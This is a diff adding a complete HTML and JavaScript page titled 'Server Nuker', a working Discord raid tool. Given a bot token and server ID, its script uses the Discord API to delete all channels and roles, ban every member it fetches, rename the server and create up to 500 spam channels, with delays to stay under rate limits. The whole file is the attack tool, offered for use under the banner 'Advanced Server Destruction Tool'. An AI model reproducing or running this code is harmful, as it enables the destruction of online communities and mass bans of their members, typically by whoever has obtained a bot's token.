@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Server Nuker - ShadowTools</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Share Tech Mono', monospace;
+      background: #0a0a0f;
+      color: #e0e0ff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-image: 
+        radial-gradient(circle at 20% 50%, rgba(255, 0, 0, 0.1) 0%, transparent 50%),
+        radial-gradient(circle at 80% 80%, rgba(255, 200, 0, 0.1) 0%, transparent 50%);
+    }
+    
+    .container {
+      width: 90%;
+      max-width: 800px;
+      background: rgba(20, 20, 30, 0.9);
+      border: 1px solid #ffaa00;
+      border-radius: 10px;
+      padding: 40px;
+      box-shadow: 
+        0 0 50px rgba(255, 170, 0, 0.2),
+        inset 0 0 50px rgba(255, 170, 0, 0.05);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .container::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #ffaa00, transparent);
+      animation: scan 3s linear infinite;
+    }
+    
+    @keyframes scan {
+      0% { left: -100%; }
+      100% { left: 100%; }
+    }
+    
+    .header {
+      text-align: center;
+      margin-bottom: 30px;
+      border-bottom: 2px solid #ffaa00;
+      padding-bottom: 20px;
+    }
+    
+    h1 {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 2.5rem;
+      color: #ffaa00;
+      text-shadow: 0 0 20px rgba(255, 170, 0, 0.5);
+      letter-spacing: 3px;
+    }
+    
+    .warning {
+      background: rgba(255, 0, 0, 0.1);
+      border: 1px solid #ff0040;
+      color: #ff0040;
+      padding: 15px;
+      border-radius: 5px;
+      margin-bottom: 30px;
+      text-align: center;
+      font-size: 0.9rem;
+    }
+    
+    .form-group {
+      margin-bottom: 25px;
+    }
+    
+    label {
+      display: block;
+      margin-bottom: 8px;
+      color: #ffaa00;
+      font-size: 0.9rem;
+      letter-spacing: 1px;
+    }
+    
+    input, textarea {
+      width: 100%;
+      padding: 12px;
+      background: rgba(0, 0, 0, 0.5);
+      border: 1px solid #ffaa00;
+      color: #fff;
+      font-family: 'Share Tech Mono', monospace;
+      border-radius: 5px;
+      transition: all 0.3s;
+    }
+    
+    input:focus, textarea:focus {
+      outline: none;
+      box-shadow: 0 0 15px rgba(255, 170, 0, 0.3);
+      border-color: #ffcc00;
+    }
+    
+    .options {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 15px;
+      margin-bottom: 25px;
+    }
+    
+    .checkbox-item {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      cursor: pointer;
+      padding: 10px;
+      background: rgba(255, 170, 0, 0.05);
+      border: 1px solid rgba(255, 170, 0, 0.2);
+      border-radius: 5px;
+      transition: all 0.3s;
+    }
+    
+    .checkbox-item:hover {
+      background: rgba(255, 170, 0, 0.1);
+      border-color: #ffaa00;
+    }
+    
+    .checkbox-item input {
+      width: auto;
+      accent-color: #ffaa00;
+    }
+    
+    .btn {
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(135deg, #ffaa00, #ff6600);
+      border: none;
+      color: #000;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 1.2rem;
+      font-weight: 700;
+      letter-spacing: 2px;
+      cursor: pointer;
+      border-radius: 5px;
+      transition: all 0.3s;
+      text-transform: uppercase;
+    }
+    
+    .btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 30px rgba(255, 170, 0, 0.4);
+    }
+    
+    .btn:disabled {
+      background: #444;
+      color: #888;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+    }
+    
+    .progress {
+      margin-top: 20px;
+      height: 30px;
+      background: rgba(0, 0, 0, 0.5);
+      border: 1px solid #ffaa00;
+      border-radius: 5px;
+      overflow: hidden;
+      display: none;
+    }
+    
+    .progress-bar {
+      height: 100%;
+      background: linear-gradient(90deg, #ffaa00, #ff6600);
+      width: 0%;
+      transition: width 0.3s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.8rem;
+      color: #000;
+      font-weight: bold;
+    }
+    
+    .log {
+      margin-top: 20px;
+      padding: 15px;
+      background: rgba(0, 0, 0, 0.5);
+      border: 1px solid #ffaa00;
+      border-radius: 5px;
+      height: 200px;
+      overflow-y: auto;
+      font-size: 0.85rem;
+      color: #ffcc00;
+    }
+    
+    .log-entry {
+      margin: 5px 0;
+      padding: 3px 0;
+      border-bottom: 1px solid rgba(255, 170, 0, 0.1);
+    }
+    
+    .success { color: #00ff80; }
+    .error { color: #ff0040; }
+    .info { color: #00ccff; }
+    
+    @media (max-width: 600px) {
+      .options {
+        grid-template-columns: 1fr;
+      }
+      h1 {
+        font-size: 1.8rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>SERVER NUKER</h1>
+      <p style="color: #ffaa00; opacity: 0.8;">Advanced Server Destruction Tool</p>
+    </div>
+    
+    <div class="warning">
+      ⚠️ WARNING: This tool will permanently delete server data. Use with extreme caution.
+    </div>
+    
+    <form id="nukeForm">
+      <div class="form-group">
+        <label>Bot Token</label>
+        <input type="password" id="token" placeholder="Enter bot token" required>
+      </div>
+      
+      <div class="form-group">
+        <label>Server ID (Guild ID)</label>
+        <input type="text" id="guildId" placeholder="Enter server ID" required>
+      </div>
+      
+      <div class="options">
+        <label class="checkbox-item">
+          <input type="checkbox" id="deleteChannels" checked>
+          <span>Delete All Channels</span>
+        </label>
+        <label class="checkbox-item">
+          <input type="checkbox" id="deleteRoles" checked>
+          <span>Delete All Roles</span>
+        </label>
+        <label class="checkbox-item">
+          <input type="checkbox" id="deleteEmojis">
+          <span>Delete Emojis</span>
+        </label>
+        <label class="checkbox-item">
+          <input type="checkbox" id="banMembers">
+          <span>Ban All Members</span>
+        </label>
+        <label class="checkbox-item">
+          <input type="checkbox" id="createChannels">
+          <span>Create Spam Channels</span>
+        </label>
+        <label class="checkbox-item">
+          <input type="checkbox" id="changeServerName">
+          <span>Change Server Name</span>
+        </label>
+      </div>
+      
+      <div class="form-group" id="newNameGroup" style="display: none;">
+        <label>New Server Name</label>
+        <input type="text" id="newServerName" placeholder="Enter new server name">
+      </div>
+      
+      <div class="form-group" id="spamChannelGroup" style="display: none;">
+        <label>Spam Channel Name</label>
+        <input type="text" id="spamChannelName" placeholder="eg. nuked" value="nuked">
+        <label style="margin-top: 10px;">Amount</label>
+        <input type="number" id="channelAmount" value="50" min="1" max="500">
+      </div>
+      
+      <button type="submit" class="btn" id="nukeBtn">
+        INITIATE DESTRUCTION
+      </button>
+      
+      <div class="progress" id="progressContainer">
+        <div class="progress-bar" id="progressBar">0%</div>
+      </div>
+      
+      <div class="log" id="log"></div>
+    </form>
+  </div>
+  
+  <script>
+    const API_BASE = 'https://discord.com/api/v9';
+    let isRunning = false;
+    
+    const log = (msg, type = 'info') => {
+      const logEl = document.getElementById('log');
+      const entry = document.createElement('div');
+      entry.className = `log-entry ${type}`;
+      entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+      logEl.appendChild(entry);
+      logEl.scrollTop = logEl.scrollHeight;
+    };
+    
+    const updateProgress = (percent) => {
+      const bar = document.getElementById('progressBar');
+      bar.style.width = percent + '%';
+      bar.textContent = percent + '%';
+    };
+    
+    document.getElementById('changeServerName').addEventListener('change', (e) => {
+      document.getElementById('newNameGroup').style.display = e.target.checked ? 'block' : 'none';
+    });
+    
+    document.getElementById('createChannels').addEventListener('change', (e) => {
+      document.getElementById('spamChannelGroup').style.display = e.target.checked ? 'block' : 'none';
+    });
+    
+    async function apiRequest(endpoint, method = 'GET', body = null, token) {
+      const options = {
+        method,
+        headers: {
+          'Authorization': `Bot ${token}`,
+          'Content-Type': 'application/json'
+        }
+      };
+      
+      if (body) {
+        options.body = JSON.stringify(body);
+      }
+      
+      const response = await fetch(`${API_BASE}${endpoint}`, options);
+      return response;
+    }
+    
+    async function getChannels(guildId, token) {
+      const res = await apiRequest(`/guilds/${guildId}/channels`, 'GET', null, token);
+      return res.json();
+    }
+    
+    async function getRoles(guildId, token) {
+      const res = await apiRequest(`/guilds/${guildId}/roles`, 'GET', null, token);
+      return res.json();
+    }
+    
+    async function getMembers(guildId, token) {
+      const res = await apiRequest(`/guilds/${guildId}/members?limit=1000`, 'GET', null, token);
+      return res.json();
+    }
+    
+    async function deleteChannel(channelId, token) {
+      return apiRequest(`/channels/${channelId}`, 'DELETE', null, token);
+    }
+    
+    async function deleteRole(roleId, guildId, token) {
+      return apiRequest(`/guilds/${guildId}/roles/${roleId}`, 'DELETE', null, token);
+    }
+    
+    async function banMember(userId, guildId, token) {
+      return apiRequest(`/guilds/${guildId}/bans/${userId}`, 'PUT', { delete_message_days: 7 }, token);
+    }
+    
+    async function createChannel(name, guildId, token) {
+      return apiRequest(`/guilds/${guildId}/channels`, 'POST', {
+        name: name,
+        type: 0,
+        permission_overwrites: []
+      }, token);
+    }
+    
+    async function modifyGuild(guildId, data, token) {
+      return apiRequest(`/guilds/${guildId}`, 'PATCH', data, token);
+    }
+    
+    document.getElementById('nukeForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      if (isRunning) return;
+      
+      const token = document.getElementById('token').value;
+      const guildId = document.getElementById('guildId').value;
+      
+      if (!confirm('本当に実行しますか？この操作は元に戻せません。')) return;
+      
+      isRunning = true;
+      document.getElementById('nukeBtn').disabled = true;
+      document.getElementById('progressContainer').style.display = 'block';
+      
+      let tasks = [];
+      let completed = 0;
+      
+      try {
+        // Change server name first
+        if (document.getElementById('changeServerName').checked) {
+          const newName = document.getElementById('newServerName').value || 'Nuked';
+          log(`Changing server name to: ${newName}`, 'info');
+          await modifyGuild(guildId, { name: newName }, token);
+          log('Server name changed', 'success');
+        }
+        
+        // Delete channels
+        if (document.getElementById('deleteChannels').checked) {
+          log('Fetching channels...', 'info');
+          const channels = await getChannels(guildId, token);
+          log(`Found ${channels.length} channels`, 'info');
+          
+          tasks.push(...channels.map(ch => ({ type: 'channel', id: ch.id, name: ch.name })));
+        }
+        
+        // Delete roles
+        if (document.getElementById('deleteRoles').checked) {
+          log('Fetching roles...', 'info');
+          const roles = await getRoles(guildId, token);
+          const deletableRoles = roles.filter(r => r.name !== '@everyone' && !r.managed);
+          log(`Found ${deletableRoles.length} deletable roles`, 'info');
+          
+          tasks.push(...deletableRoles.map(r => ({ type: 'role', id: r.id, name: r.name })));
+        }
+        
+        // Ban members
+        if (document.getElementById('banMembers').checked) {
+          log('Fetching members...', 'info');
+          const members = await getMembers(guildId, token);
+          log(`Found ${members.length} members`, 'info');
+          
+          tasks.push(...members.map(m => ({ type: 'member', id: m.user.id, name: m.user.username })));
+        }
+        
+        const totalTasks = tasks.length;
+        log(`Starting destruction of ${totalTasks} objects...`, 'info');
+        
+        // Process deletions
+        for (const task of tasks) {
+          if (!isRunning) break;
+          
+          try {
+            if (task.type === 'channel') {
+              await deleteChannel(task.id, token);
+              log(`Deleted channel: ${task.name}`, 'success');
+            } else if (task.type === 'role') {
+              await deleteRole(task.id, guildId, token);
+              log(`Deleted role: ${task.name}`, 'success');
+            } else if (task.type === 'member') {
+              await banMember(task.id, guildId, token);
+              log(`Banned user: ${task.name}`, 'success');
+            }
+            
+            completed++;
+            updateProgress(Math.round((completed / totalTasks) * 100));
+            
+            // Rate limit protection
+            await new Promise(r => setTimeout(r, 100));
+          } catch (err) {
+            log(`Failed to process ${task.name}: ${err.message}`, 'error');
+          }
+        }
+        
+        // Create spam channels
+        if (document.getElementById('createChannels').checked) {
+          const spamName = document.getElementById('spamChannelName').value || 'nuked';
+          const amount = parseInt(document.getElementById('channelAmount').value) || 50;
+          
+          log(`Creating ${amount} spam channels...`, 'info');
+          
+          for (let i = 0; i < amount; i++) {
+            if (!isRunning) break;
+            try {
+              await createChannel(`${spamName}-${i}`, guildId, token);
+              log(`Created channel: ${spamName}-${i}`, 'success');
+              updateProgress(Math.round(((completed + i) / (totalTasks + amount)) * 100));
+              await new Promise(r => setTimeout(r, 100));
+            } catch (err) {
+              log(`Failed to create channel: ${err.message}`, 'error');
+            }
+          }
+        }
+        
+        log('Destruction complete!', 'success');
+        
+      } catch (err) {
+        log(`Error: ${err.message}`, 'error');
+      } finally {
+        isRunning = false;
+        document.getElementById('nukeBtn').disabled = false;
+        updateProgress(100);
+      }
+    });
+  </script>
+</body>
+</html>
